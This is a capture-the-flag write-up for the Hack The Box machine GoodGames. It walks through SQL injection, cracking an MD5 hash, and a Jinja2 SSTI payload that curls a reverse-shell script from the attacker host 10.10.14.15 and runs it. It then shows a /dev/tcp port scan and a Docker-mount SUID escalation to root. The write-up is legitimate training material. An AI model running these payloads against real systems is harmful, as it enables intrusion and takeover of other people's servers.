

![1](</Writeups/Machines/GoodGames/img/logo.png>)
By Rug4lo

## Reconnaissance

We start with the usual [[Nmap]] scan
```bash
nmap -p- --open -sS -min-rate 5000 -vvv -n -Pn -oG allPorts 10.10.11.130
```
```bash
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.93 ( https://nmap.org ) at 2023-11-03 18:04 CET
Initiating SYN Stealth Scan at 18:04
Scanning 10.10.11.130 [65535 ports]
Discovered open port 80/tcp on 10.10.11.130
Completed SYN Stealth Scan at 18:04, 12.20s elapsed (65535 total ports)
Nmap scan report for 10.10.11.130
Host is up, received user-set (0.078s latency).
Scanned at 2023-11-03 18:04:23 CET for 12s
Not shown: 65532 closed tcp ports (reset), 2 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 12.41 seconds
           Raw packets sent: 66957 (2.946MB) | Rcvd: 66270 (2.651MB)
```
We can browse the website to see what's there 

![1](</Writeups/Machines/GoodGames/img/1.png>)

We see that there is a login

![1](</Writeups/Machines/GoodGames/img/2.png>)

We intercept the request with [[Burpsuite]], and we can try an SQLi

![1](</Writeups/Machines/GoodGames/img/3.png>)

This will work and we'll be logged in as the admin user

![1](</Writeups/Machines/GoodGames/img/4.png>)

If we click on settings we'll see that it sends us to a page called `http://internal-administration.goodgames.htb`; we add it to etc hosts and we'll see this panel

![1](</Writeups/Machines/GoodGames/img/5.png>)

We can try an SQLi on this panel too, but we won't get anywhere

But remembering that we can do an SQLi on the previous panel, we can go through the database looking for valid credentials

First we can work out the number of columns 

![1](</Writeups/Machines/GoodGames/img/6.png>)

Knowing that it has 4 columns we can start dumping information, such as the databases 

![1](</Writeups/Machines/GoodGames/img/7.png>)
![1](</Writeups/Machines/GoodGames/img/8.png>)

Now we can list the tables in the database like this

![1](</Writeups/Machines/GoodGames/img/9.png>)

We can see 3 tables; let's focus on user

![1](</Writeups/Machines/GoodGames/img/10.png>)

Now let's list the columns of the user table

![1](</Writeups/Machines/GoodGames/img/11.png>)

![1](</Writeups/Machines/GoodGames/img/12.png>)

Finally let's dump the contents of the password and name fields

![1](</Writeups/Machines/GoodGames/img/13.png>)

![1](</Writeups/Machines/GoodGames/img/14.png>)

We have the Admin user's password, but it appears to be hashed

With the Hash Identifier tool we can see that it is hashed with md5

![1](</Writeups/Machines/GoodGames/img/15.png>)

We can go to this site to get the password 

Site --> https://hashes.com/en/decrypt/hash

We'll see that this is the password 

![1](</Writeups/Machines/GoodGames/img/16.png>)

We can try entering it in the previous login, and we'll see that it works

![1](</Writeups/Machines/GoodGames/img/17.png>)

Now inside this admin panel we can see there isn't much to do, but under "Settings" there is a section where we can change our name

Since the output is reflected on the page, we can try an SSTI

![1](</Writeups/Machines/GoodGames/img/18.png>)

First we try entering `{{7*7}}`; if it performs the multiplication that means it is vulnerable

![1](</Writeups/Machines/GoodGames/img/19.png>)

Great, since it is vulnerable we can try to execute commands. In my case I'll spin up a python server to share a file called shell, which contains a reverse shell

Using the command execution I'll download that file onto the victim machine and run it

Let's copy the file into /tmp on the victim machine 
```bash
{{ self.__init__.__globals__.__builtins__.__import__('os').popen("curl 10.10.14.15:8081/shell -o /tmp/shell").read() }}
```
Now let's set up a netcat listener and run the script
```bash
{{ self.__init__.__globals__.__builtins__.__import__('os').popen("bash /tmp/shell").read() }}
```
With this we'll have an interactive shell as root, but inside a container 

![1](</Writeups/Machines/GoodGames/img/20.png>)

Even so, if we look around we'll find the user flag in augustus's home directory

![1](</Writeups/Machines/GoodGames/img/21.png>)

Now we have to go after the root flag. If we dig into it, we'll see that the augustus directory is a mount from the host machine

![1](</Writeups/Machines/GoodGames/img/22.png>)

With that in mind we know that the user augustus exists on the host machine, and if we do a port scan from inside the docker container we'll see that it has port 22 open 
```bash
for port in {1..65535}; do echo > /dev/tcp/172.19.0.1/$port && echo "$port open"; done 2>/dev/null
```
If we connect reusing the admin user's password we'll see that it lets us in

![1](</Writeups/Machines/GoodGames/img/23.png>)

Now that we are on the host machine, remember that we have a mount shared with the docker container, and inside the container we are root, so we can copy /bin/bash into augustus's home directory

![1](</Writeups/Machines/GoodGames/img/24.png>)

Now we go back to the Docker container, copy this bash again but this time as root, and set the SUID bit on the bash copy

![1](</Writeups/Machines/GoodGames/img/25.png>)

Alright, if we reconnect over ssh and run the new bash we'll see that we become root

![1](</Writeups/Machines/GoodGames/img/26.png>)

Now we can go to /root and read the flag

![1](</Writeups/Machines/GoodGames/img/27.png>)
